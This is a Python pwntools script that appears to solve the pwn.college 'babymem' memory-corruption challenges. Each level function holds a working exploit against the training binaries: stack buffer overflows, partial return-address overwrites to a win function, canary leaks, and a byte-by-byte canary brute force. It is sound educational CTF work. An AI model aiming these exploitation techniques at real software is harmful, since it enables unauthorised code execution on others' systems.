import pwn
import sys

pwn.context.log_level = 'error'

class Level:
    def __init__(self, hostname):
        self.level = hostname.split('~')[1].replace('level', '').replace('-','.').splitlines()[0] \
            if '~' in hostname \
            else hostname
        self.remote_process = f"/challenge/babymem_level{self.level}"
        self.local_process = f"binaries/babymem_level{self.level}"
        self.func_name = f"level{self.level.replace('.', '_')}"
        self.run = globals()[self.func_name]

def level1_0(level, p):
    p.recvuntil(b"size: ")
    p.sendline(b"70")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*70)
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level1_1(level, p):
    p.recvuntil(b"size: ")
    p.sendline(b"70")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*70)
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level2_0(level, p):
    p.recvuntil(b"size: ")
    p.sendline(b"110")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*104 + pwn.p32(0x66aa9282))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level2_1(level, p):
    p.recvuntil(b"size: ")
    p.sendline(b"120")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*108 + pwn.p32(0x3c35f032))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level3_0(level, p):
    p.recvuntil(b"size: ")
    p.sendline(b"160")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*152 + pwn.p64(0x4023a5))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level3_1(level, p):
    num_a = 0x7fff4c2263a8 - 0x7fff4c226320
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"size: ")
    p.sendline(b"160")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win']))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level4_0(level, p):
    num_a = 0x7ffc6678ea68 - 0x7ffc6678ea00
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"size: ")
    p.sendline(b"-1")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win']))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level4_1(level, p):
    num_a = 0x7ffdd7481638 - 0x7ffdd74815c0
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"size: ")
    p.sendline(b"-1")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win']))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level5_0(level, p):
    num_a = 0x7ffea75c9568 - 0x7ffea75c94e0
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"records to send: ")
    p.sendline(b"2147483648")
    p.recvuntil(b"record: ")
    p.sendline(b"2")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win']))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level5_1(level, p):
    num_a = 0x7ffd9914e5c8 - 0x7ffd9914e580
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"records to send: ")
    p.sendline(b"2147483648")
    p.recvuntil(b"record: ")
    p.sendline(b"2")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win']))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level6_0(level, p):
    num_a = 0x7ffcbdf77d78 - 0x7ffcbdf77d20
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"size")
    p.sendline(b"200")
    p.recvuntil(b"bytes)!\n")
    p.sendline(b"A"*num_a + pwn.p64(elf.symbols['win_authed']+28))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level6_1(level, p):
    num_a = 0x7ffd5db1f608 - 0x7ffd5db1f5b0
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    p.recvuntil(b"size")
    p.sendline(b"200")
    p.recvuntil(b"bytes)!\n")
    p.send(b"A"*num_a + pwn.p64(elf.symbols['win_authed']+28))
    p.recvuntil(b"flag:\n")
    print(p.recvline().decode())

def level7_0(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                num_a = 0x7ffeac20eed8 - 0x7ffeac20ee70
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                p.recvuntil(b"size")
                p.sendline(b"200")
                p.recvuntil(b"bytes)!\n")
                #p.send(b"A"*num_a + pwn.p64(elf.symbols['win_authed']+28))
                p.send(b"A"*num_a + b"\x3a\x0f")
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level7_1(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                num_a = 0x7ffc3b100da8 - 0x7ffc3b100d70
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                p.recvuntil(b"size")
                p.sendline(b"200")
                p.recvuntil(b"bytes)!\n")
                p.send(b"A"*num_a + pwn.pack(elf.symbols['win_authed']+28)[:2])
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level8_0(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                num_a = 0x7ffde1469cc8 - 0x7ffde1469c60 - 2
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                p.recvuntil(b"size")
                p.sendline(b"200")
                p.recvuntil(b"bytes)!\n")
                p.send(b"A\0" + b"A"*num_a + pwn.pack(elf.symbols['win_authed']+28)[:2])
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level8_1(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                num_a = 0x7ffc80c1d4c8 - 0x7ffc80c1d480 - 2
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                p.recvuntil(b"size")
                p.sendline(b"200")
                p.recvuntil(b"bytes)!\n")
                p.send(b"A\0" + b"A"*num_a + pwn.pack(elf.symbols['win_authed']+28)[:2])
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level9_0(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buf_start = 0x7ffd2e52ca70
                n_loc = 0x7ffd2e52cacc
                ret_addr = 0x7ffd2e52cae8
                num_a = n_loc - buf_start
                num_n = ret_addr - buf_start - 1
                payload_length = num_n + 3
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                payload = b"A"*num_a + num_n.to_bytes() + pwn.pack(elf.symbols['win_authed']+28)[:2]
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level9_1(level, p):
    err = True
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buf_start = 0x7fff66116990
                n_loc = 0x7fff66116a08
                ret_addr = 0x7fff66116a28
                num_a = n_loc - buf_start
                num_n = ret_addr - buf_start - 1
                payload_length = num_n + 3
                elf = pwn.context.binary = pwn.ELF(level.local_process)
                payload = b"A"*num_a + num_n.to_bytes() + pwn.pack(elf.symbols['win_authed']+28)[:2]
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level10_0(level, p):
    flag_loc = 0x7ffcbb21fb5f
    buf_start = 0x7ffcbb21fb40
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    p.recvuntil(b"size: ")
    p.sendline(str(payload_length).encode())
    p.recvuntil(b"bytes)!\n")
    p.send(payload)
    p.recvuntil(b"said: " + payload)
    print(p.recvline().decode())

def level10_1(level, p):
    flag_loc = 0x7ffe406bb914
    buf_start = 0x7ffe406bb8f0
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    p.recvuntil(b"size: ")
    p.sendline(str(payload_length).encode())
    p.recvuntil(b"bytes)!\n")
    p.send(payload)
    p.recvuntil(b"said: " + payload)
    print(p.recvline().decode())

def level11_0(level, p):
    flag_loc = 0x773ada8e6000
    buf_start = 0x773ada8e2000
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    print(p.recvuntil(b"size: ").decode())
    p.sendline(str(payload_length).encode())
    print(p.recvuntil(b"bytes)!\n").decode())
    p.send(payload)
    print(p.recvall(timeout=1).decode())

def level11_1(level, p):
    flag_loc = 0x7f24eeb7a000
    buf_start = 0x7f24eeb72000
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    print(p.recvuntil(b"size: ").decode())
    p.sendline(str(payload_length).encode())
    print(p.recvuntil(b"bytes)!\n").decode())
    p.send(payload)
    print(p.recvall(timeout=1).decode())

def level12_0(level, p):
    err = True
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buffer = 0x7ffc1bcbdfe0
                canary = 0x7ffc1bcbe058
                retadr = 0x7ffc1bcbe068

                init_payload = b"REPEAT"
                init_payload += b"A" * (canary-buffer-len("REPEAT")+1)
                payload_length = len(init_payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())

                p.recvuntil(b"bytes)!\n")
                p.send(init_payload)
                p.recvuntil(init_payload)
                canary_value = b'\0' + p.recv(7)

                payload = b"A" * (canary-buffer)
                payload += canary_value
                payload += b"B" * 8
                payload += pwn.pack(elf.symbols['win_authed']+28)[:2]
                payload_length = len(payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level12_1(level, p):
    err = True
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buffer = 0x7fffffffa8b0
                canary = 0x7fffffffa8d8
                retadr = 0x7fffffffa8e8

                init_payload = b"REPEAT"
                init_payload += b"A" * (canary-buffer-len("REPEAT")+1)
                payload_length = len(init_payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())

                p.recvuntil(b"bytes)!\n")
                p.send(init_payload)
                p.recvuntil(init_payload)
                canary_value = b'\0' + p.recv(7)

                payload = b"A" * (canary-buffer)
                payload += canary_value
                payload += b"B" * 8
                payload += pwn.pack(elf.symbols['win_authed']+28)[:2]
                payload_length = len(payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level13_0(level, p):
    flag_loc = 0x7ffc7ab008d0
    buf_start = 0x7ffc7ab00880
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    p.recvuntil(b"size: ")
    p.sendline(str(payload_length).encode())
    p.recvuntil(b"bytes)!\n")
    p.send(payload)
    p.recvuntil(payload)
    print(p.recvline().decode())

def level13_1(level, p):
    flag_loc = 0x7fffffffa7cb
    buf_start = 0x7fffffffa7b0
    num_a = flag_loc - buf_start
    payload_length = num_a
    payload = b"A"*num_a
    p.recvuntil(b"size: ")
    p.sendline(str(payload_length).encode())
    p.recvuntil(b"bytes)!\n")
    p.send(payload)
    p.recvuntil(payload)
    print(p.recvline().decode())

def level14_0(level, p):
    err = True
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buffer = 0x7ffeb7f5b2b0
                leaked = 0x7ffeb7f5b338
                canary = 0x7ffeb7f5b458

                init_payload = b"REPEAT"
                init_payload += b"A" * (leaked-buffer-len("REPEAT")+1)
                payload_length = len(init_payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())

                p.recvuntil(b"bytes)!\n")
                p.send(init_payload)
                p.recvuntil(init_payload)
                canary_value = b'\0' + p.recv(7)

                payload = b"A" * (canary-buffer)
                payload += canary_value
                payload += b"B" * 8
                payload += pwn.pack(elf.symbols['win_authed']+28)[:2]
                payload_length = len(payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level14_1(level, p):
    err = True
    elf = pwn.context.binary = pwn.ELF(level.local_process)
    while err:
        try:
            #TODO: How do I do this remotely over ssh?
            with pwn.process(level.local_process) as p:
                buffer = 0x7ffc544e2820
                leaked = 0x7ffc544e28c8
                canary = 0x7ffc544e29e8

                init_payload = b"REPEAT"
                init_payload += b"A" * (leaked-buffer-len("REPEAT")+1)
                payload_length = len(init_payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())

                p.recvuntil(b"bytes)!\n")
                p.send(init_payload)
                p.recvuntil(init_payload)
                canary_value = b'\0' + p.recv(7)

                payload = b"A" * (canary-buffer)
                payload += canary_value
                payload += b"B" * 8
                payload += pwn.pack(elf.symbols['win_authed']+28)[:2]
                payload_length = len(payload)
                p.recvuntil(b"size: ")
                p.sendline(str(payload_length).encode())
                p.recvuntil(b"bytes)!\n")
                p.send(payload)
                p.recvuntil(b"flag:\n")
                print(p.recvline().decode())
                err = False
        except EOFError:
            continue

def level15_0(level, p):
    buffer = 72
    canary_list = []
    print("[*] Brute forcing canary")
    while len(canary_list) < 8:
        for c in range(255):
            with pwn.remote('localhost', 1337) as r:
                print(f"Canary: {(b''.join(canary_list) + c.to_bytes()).hex()}", end='\r')
                r.recvuntil(b"size: ")
                #r.sendafter(b"size: ", b"72")
                payload = b"A"*buffer + b''.join(canary_list) + c.to_bytes()
                size = len(payload)
                r.sendline(str(size).encode())
                r.recvuntil(b"bytes)!\n")
                r.send(payload)
                r.recvuntil(b'Goodbye!')
                resp = r.recv()
                if b"stack smashing detected" not in resp:
                    canary_list.append(c.to_bytes())
                    break

    canary = b''.join(canary_list)
    print(f"Canary: {canary.hex()}")

    print("[*] Overwriting last few bytes of return address")

    elf = pwn.context.binary = pwn.ELF(level.local_process)
    win_authed = elf.symbols['win_authed']+28
    while win_authed > 0:
        win_authed = win_authed - 0x1000
    win_authed = win_authed + 0x1000

    for i in range(16):
        #TODO: How do I do this remotely over ssh?
        with pwn.remote('localhost', 1337) as r:
            print(f"win_authed: {hex(win_authed)}", end="\r")
            payload = b"A" * buffer
            payload += canary
            payload += b"B" * 8
            payload += pwn.pack(win_authed)[:2]
            payload_length = len(payload)
            r.recvuntil(b"size: ")
            r.sendline(str(payload_length).encode())
            r.recvuntil(b"bytes)!\n")
            r.send(payload)
            resp = r.recvall(timeout=1)
            resp.decode()
            if b'flag:' in resp:
                print(f"win_authed: {hex(win_authed)}")
                flag = resp.split(b"flag:\n")[1]
                print(flag.decode())
                break
            else:
                win_authed += 0x1000

    p.close()

def level15_1(level, p):
    buf = 0x7fffffffa900
    can = 0x7fffffffa918
    buffer = can - buf
    canary_list = []
    print("[*] Brute forcing canary")
    while len(canary_list) < 8:
        for c in range(255):
            with pwn.remote('localhost', 1337) as r:
                print(f"Canary: {(b''.join(canary_list) + c.to_bytes()).hex()}", end='\r')
                r.recvuntil(b"size: ")
                #r.sendafter(b"size: ", b"72")
                payload = b"A"*buffer + b''.join(canary_list) + c.to_bytes()
                size = len(payload)
                r.sendline(str(size).encode())
                r.recvuntil(b"bytes)!\n")
                r.send(payload)
                r.recvuntil(b'Goodbye!')
                resp = r.recv()
                if b"stack smashing detected" not in resp:
                    canary_list.append(c.to_bytes())
                    break

    canary = b''.join(canary_list)
    print(f"Canary: {canary.hex()}")

    print("[*] Overwriting last few bytes of return address")

    elf = pwn.context.binary = pwn.ELF(level.local_process)
    win_authed = elf.symbols['win_authed']+28
    while win_authed > 0:
        win_authed = win_authed - 0x1000
    win_authed = win_authed + 0x1000

    for i in range(16):
        #TODO: How do I do this remotely over ssh?
        with pwn.remote('localhost', 1337) as r:
            print(f"win_authed: {hex(win_authed)}", end="\r")
            payload = b"A" * buffer
            payload += canary
            payload += b"B" * 8
            payload += pwn.pack(win_authed)[:2]
            payload_length = len(payload)
            r.recvuntil(b"size: ")
            r.sendline(str(payload_length).encode())
            r.recvuntil(b"bytes)!\n")
            r.send(payload)
            resp = r.recvall(timeout=1)
            resp.decode()
            if b'flag:' in resp:
                print(f"win_authed: {hex(win_authed)}")
                flag = resp.split(b"flag:\n")[1]
                print(flag.decode())
                break
            else:
                win_authed += 0x1000

    p.close()


def get_level(r):
    p = r.process("hostname")
    hostname = p.recvall(timeout=1).decode()
    level = Level(hostname)
    print(f"LEVEL {level.level}")
    return level

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    if len(sys.argv) == 3 and sys.argv[1] == 'local':
        level = Level(sys.argv[2])
        p = pwn.process(level.local_process)

    elif sys.argv[1] == 'remote':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = r.process(level.remote_process)

    elif sys.argv[1] == 'local':
        r = pwn.ssh(user="hacker", host="pwn.college", keyfile="~/.ssh/pwn.college")
        level = get_level(r)
        p = pwn.process(f"binaries/babymem_level{level.level}")

    else:
        print(f"Usage: {sys.argv[0]} <remote|local> (level)")
        exit()

    level.run(level, p)

